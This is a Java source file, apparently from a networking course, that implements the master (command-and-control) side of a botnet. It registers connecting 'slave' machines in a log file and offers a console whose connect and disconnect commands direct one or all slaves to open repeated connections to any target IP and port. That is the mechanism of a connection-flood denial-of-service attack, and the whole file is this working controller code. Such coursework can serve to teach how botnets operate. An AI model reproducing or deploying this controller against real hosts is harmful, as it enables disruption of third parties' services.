package com.networkdesign.cmpe;
import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;

public class MasterBot extends Thread {
	// variables
	static String slaveIP, targetIP;
	static int connectedSlaves, targetPort, connectionCount;

	private ServerSocket ss;
	static ArrayList<Socket> slaveList = new ArrayList<>();
	static SlaveBot sb = new SlaveBot();

	// constructor
	public MasterBot(int port) throws IOException {
		ss = new ServerSocket(port);
	}

	// run threads
	public void run() {
		BufferedWriter bw = null;
		String info = "";
		connectedSlaves = 0;

		// create file to store the slave info
		try {
			File f = new File("slaveInfo.txt");
			bw = new BufferedWriter(new FileWriter(f));
			Date date = new Date();
			info = "SlaveHostName" + "\t" + "IPAddress" + "\t\t" + "SourcePortNumber" + "\t" + "RegistrationDate";
			bw.write(info);

			while (true) {
				Socket ss = new Socket();
				ss = this.ss.accept();
				slaveList.add(ss);
				connectedSlaves++;
				bw.newLine();
				bw.newLine();

				info = "Slave" + connectedSlaves + "\t";
				bw.write(info);

				info = "\t" + ss.getRemoteSocketAddress() + "\t";
				bw.write(info);

				info = ss.getPort() + "\t\t";
				bw.write(info);

				info = "\t" + new SimpleDateFormat("yyyy-MM-dd").format(date);
				bw.write(info);

				bw.flush();
			}

		} catch (IOException e) {
			e.printStackTrace();
		}

		finally {
			try {
				ss.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	// main function
	public static void main(String[] args) {
		String cli;
		BufferedReader br1 = new BufferedReader(new InputStreamReader(System.in));
		int port = 0;
		// input example = "-p 9999"
		if (args.length != 0) {
			port = Integer.parseInt(args[1]);
		}
		// no input arguments given, use default port 1234
		else {
			System.out.println("Using default port number 1234");
			port = 1234;
		}

		if (port != 0) {
			try {
				Thread thread = new MasterBot(port);
				thread.start();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		// CLI
		while (true) {
			try {
				System.out.print("> ");
				cli = br1.readLine();
				// if nothing entered, loop
				if (cli.equals("")) {
					continue;
				}

				// list command
				else if (cli.equals("list")) {
					BufferedReader br2 = new BufferedReader(new FileReader("slaveInfo.txt"));
					String getLine;
					while ((getLine = br2.readLine()) != null) {
						System.out.println(getLine);
					}
					System.out.println("\n" + " Number of available slaves: " + connectedSlaves);
					continue;
				}

				// connect command
				else if (cli.startsWith("connect")) {
					// slave count = 0
					if (connectedSlaves == 0) {
						System.out.println("No Slaves are currently connected.");
						continue;
					}

					String[] dataArray = cli.split("\\s+");
					// connection count is not defined, default to 1
					if (dataArray.length == 4) {
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
					}
					// connection count is defined
					else if (dataArray.length == 5) {
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
					}
					// all slaves
					if (slaveIP.equalsIgnoreCase("all")) {
						for (int i = 0; i < slaveList.size(); i++) {
							for (int j = 0; j < connectionCount; j++) {
								sb.connect(slaveList.get(i), targetIP, targetPort);
							}
						}
					}

					// specific slave (must enter "ip:port")
					else {
						String ipCheck, hostNameCheck;
						for (int i = 0; i < slaveList.size(); i++) {
							ipCheck = "/" + slaveIP;
							hostNameCheck = slaveIP;

							if (ipCheck.equalsIgnoreCase(slaveList.get(i).getRemoteSocketAddress().toString())) {
								for (int j = 0; j < connectionCount; j++) {
									sb.connect(slaveList.get(i), targetIP, targetPort);
								}
							} else if (hostNameCheck.equalsIgnoreCase("Slave" + (i + 1))) {
								for (int j = 0; j < connectionCount; j++) {
									sb.connect(slaveList.get(i), targetIP, targetPort);
								}
							}

						}
					}
					continue;
				}
				
				// disconnect command
				else if (cli.startsWith("disconnect")) {
					// slave count = 0
					if (connectedSlaves == 0) {
						System.out.println("No Slaves are currently connected.");
						continue;
					}

					String[] dataArray = cli.split("\\s+");
					// connection count is not defined, default to 1
					if (dataArray.length == 4) {
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
					}
					// connection count is defined
					else if (dataArray.length == 5) {
						slaveIP = dataArray[1];
						targetIP = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
					}
					// all slaves
					if (slaveIP.equalsIgnoreCase("all")) {
						for (int i = 0; i < slaveList.size(); i++) {
							for (int j = 0; j < connectionCount; j++) {
								sb.disconnect(slaveList.get(i), targetIP, targetPort);
							}
						}
					}
					// specific slave (must enter "ip:port")
					else {
						String ipCheck, hostNameCheck;
						for (int i = 0; i < slaveList.size(); i++) {
							ipCheck = "/" + slaveIP;
							hostNameCheck = slaveIP;

							if (ipCheck.equalsIgnoreCase(slaveList.get(i).getRemoteSocketAddress().toString())) {
								for (int j = 0; j < connectionCount; j++) {
									sb.disconnect(slaveList.get(i), targetIP, targetPort);
								}
							} else if (hostNameCheck.equalsIgnoreCase("Slave" + (i + 1))) {
								for (int j = 0; j < connectionCount; j++) {
									sb.disconnect(slaveList.get(i), targetIP, targetPort);
								}
							}
						}
					}
					continue;
				}
				// exit
				else if (cli.equalsIgnoreCase("exit")) {
					System.out.println("Program exitting...");
					System.exit(0);
				} else {
					System.out.println("Please use one of the following commands: list, connect, disconnect and exit");
					continue;
				}

			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

}
